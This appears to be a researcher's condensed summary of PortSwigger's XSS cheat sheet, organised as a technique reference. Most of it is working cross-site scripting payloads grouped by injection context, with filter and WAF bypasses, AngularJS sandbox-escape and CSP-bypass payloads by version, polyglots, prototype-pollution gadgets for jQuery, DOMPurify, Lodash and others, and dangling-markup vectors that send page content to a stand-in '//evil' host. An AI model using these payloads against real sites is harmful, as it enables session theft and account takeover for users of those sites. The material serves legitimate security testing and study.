# PortSwigger XSS cheat sheet: context model, representative vectors, polyglots

- **Vuln type / sub-variant:** Reference/technique. Reflected, stored and DOM XSS vectors organised by injection context, plus filter/WAF bypass, sandbox escape, CSP bypass, dangling markup and prototype-pollution gadget tables. Raw file is the full page (living page, last updated 2026-10-21); the browser-support icons were images and are not captured.
- **Target type:** Any web app that reflects or stores input in HTML, attributes, JS strings or URLs; AngularJS/Vue apps (CSTI); apps using jQuery, DOMPurify, Lodash etc. (pollution gadgets).
- **Recon signal:** Probe the reflection point, identify which context it lands in, then pick vectors that survive that context's character restrictions (blocked parens, quotes, `>`, spaces, length limit).
- **Root cause:** Untrusted data reaches an HTML/JS/URL parser without context-appropriate encoding. The sheet's point is that each context has a different "break-out" and a different set of dangerous sinks.
- **Exploitation steps:** (method taught: pick the context, then the vector)
  1. Context model with the sheet's own labels and representative vectors:
     - HTML body (`html`): `<svg onload=alert(1)>`, `<img src onerror=alert(1)>`, `<details open ontoggle=alert(1)>`, no-click focus trick `<xss tabindex=1 autofocus onfocus=alert(1)>` (custom tag `<xss>` for tag-allowlist probing).
     - Quoted attribute (`attribute_double`): break out with `"/onfocus=alert(1) tabindex=1 autofocus/` (slash as attribute separator, autofocus makes it fire without interaction).
     - Unquoted attribute (`attribute_unquoted`): `1 onfocus=alert(1) autofocus/` (space ends the value).
     - URL attribute (`attribute_href`): `javascript:alert(1)`; tolerance tricks `JaVaScript:`, leading chars \x01-\x20, tab/newline inside the scheme (`java&Tab;script:`, `javascript&colon;alert(1)`), numeric entities (`&#106;avascript:`).
     - JS string (`js_string_single`): `'-alert(1)-'`, `';alert(1)//`, `';eval(name)//` (payload stashed in `window.name`), encoded forms `'-alert(1)-'`, `'-self['a'+'lert'](1)-'`.
     - JS comment (`js_comment`) and template literal: close the construct, or use `${...}` inside backticks; the sheet also shows `self[`${`a`}lert`](1)` style access.
     - Script-block injection with hoisting: `<script>eval(myUndefVar);var inject="INJECTION_STARTS_HERE";var myUndefVar;alert(1);//";</script>` (declare the undefined name yourself so earlier code does not throw).
  2. When tags are consumed by a parent, escape the consuming element: `<style><img title="</style><img src onerror=alert(1)>"></style>` (same idea for `noscript`, `noembed`, `xmp`, `iframe`, `textarea`, `title`, `noframes`); inside `<select>` use `<select><style></select><img src onerror=alert(1)></style></select>`; MathML wrappers like `<math><textarea><img src onerror=alert(1)></textarea></math>`.
  3. Restricted characters (representative):
     - No parentheses: `<script>onerror=alert;throw 1</script>`, `<script>alert`1`</script>`, `<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>`, `<script>location='javascript:alert\x281\x29'</script>`.
     - No `>`: `<svg onload=alert(1)` or `<svg onload=alert(1)<!--`.
     - Payload smuggling via `window.name`: `<script>window.name='alert(1)';</script><script>location=name</script>`, and `<q oncut=eval(name` style short vectors from the "impossible labs".
  4. Protocol/other-attribute sinks: `<iframe srcdoc="<img src=1 onerror=alert(1)>">`, `<form action=javascript:alert(1)>`, `<button formaction=javascript:alert(1)>`, `<svg><a xlink:href="javascript:alert(1)">`, `<script src="data:text/javascript,alert(1)">`, `<math><x href="javascript:alert(1)">blah`.
  5. Non-interactive hidden-element trick: `<input type="hidden" accesskey="X" onclick="alert(1)">` (needs ALT+SHIFT+X), and `<input type=hidden id=x onbeforematch=alert(1) hidden=until-found>`.
  6. Charset/encoding: UTF-7 (`<meta charset="UTF-7">` + `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`), overlong UTF-8, unicode/hex/octal JS escapes, HTML entities in URL attributes, base64 data URLs (`<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>`).
- **Bypasses used:** Alternative event handlers (full lists of no-interaction vs interaction-required handlers by tag); `autofocus`+`tabindex`+`onfocus`; entity/escape encodings; string concatenation to dodge keyword WAFs (`';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//`); length-limited vectors (16-char `<q oncut=alert``); content-type tricks with nosniff (`text/html`, `image/svg+xml`, `application/xhtml+xml`, `text/vtt`, etc.) and Content-Type header injection variants (`text/html;`, `text/html xxx`); iframe `sandbox` / `<meta http-equiv=refresh>` / referrer controls as helper tags.
- **Key sandbox-escape / CSTI payloads (AngularJS, by version):**
  - 1.0.1-1.1.5 and >=1.6.0: `{{constructor.constructor('alert(1)')()}}`; shorter `{{$on.constructor('alert(1)')()}}`.
  - 1.2.2-1.2.5 (and listed up to 1.3.x): `{{{}.")));alert(1)//"}}`.
  - 1.3.20: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}`; 1.4.0-1.4.9: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`.
  - 1.5.0-1.5.8: `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}`.
  - DOM-based variant (no `$eval`, uses `orderBy`): `constructor.constructor('alert(1)')()` (old versions), `toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)` (newer).
  - AngularJS CSP bypass (all versions): `<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">`; shorter `<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>`.
- **Polyglots (as listed):**
  - `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
  - `javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>`
  - Third variant starts `javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>`.
- **Prototype pollution gadget table (library, pollute, sink):** jQuery `$(html)` with `Object.prototype.div=['1','<img src onerror=alert(1)>','1']`; jQuery `$.get` with `Object.prototype.url=['data:,alert(1)//']` + `dataType='script'`; `$.getScript` with `Object.prototype.src=['data:,alert(1)//']`; Wistia `Object.prototype.innerHTML='<img/src/onerror=alert(1)>'`; reCAPTCHA `Object.prototype.srcdoc=['<script>alert(1)<\/script>']`; DOMPurify <=2.0.12 `Object.prototype.ALLOWED_ATTR=['onerror','src']`; Lodash <=4.17.15 `Object.prototype.sourceURL='  alert(1)'` then `_.template`; sanitize-html `Object.prototype['*']=['onload']`.
- **Dangling markup (scriptless):** open an attribute that swallows following markup and sends it out, e.g. `<img src="//evil?`, `<link rel=stylesheet href="//evil?`, `<form><button formaction=//evil>XSS</button><textarea name=x>`, `<meta http-equiv="refresh" content="0; http://evil?`.
- **Impact:** Not stated (reference). Use to prove JS execution in the target origin.
- **Bounty:** n/a
- **Lesson / pattern:** Classify the sink context first (HTML, attribute quoted/unquoted, URL attribute, JS string/comment/template literal, framework template), then choose a vector whose break-out character set and execution primitive survive the filter. Keep a no-parens, no-`>` and window.name fallback ready.
- **Source:**
  - Title: Cross-site scripting (XSS) cheat sheet
  - Author: PortSwigger Research
  - URL: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
  - Date: living page, last updated 2026-10-21 (scraped 2026-11-16)
  - Disclosed report: none
  - Raw file: `sources/xss/17-portswigger-xss-cheat-sheet.md`

Tags: context, polyglot, sandbox-escape, filter-bypass, csp-bypass, methodology
